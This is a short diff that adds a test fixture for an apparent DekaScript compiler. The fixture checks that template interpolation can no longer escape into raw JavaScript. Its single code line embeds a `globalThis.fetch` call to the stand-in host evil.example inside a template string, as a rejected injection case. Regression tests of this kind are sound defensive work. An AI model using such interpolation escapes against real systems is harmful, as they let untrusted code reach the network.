@@ -1,0 +1,4 @@
+// dsc#89: `${...}` is parsed and checked as DekaScript, not passed through
+// as raw JavaScript. `globalThis` is not a DekaScript name, so this is a
+// check-time error — the hatch that used to emit arbitrary JS is closed.
+const s = `hello ${globalThis.fetch("http://evil.example")}`
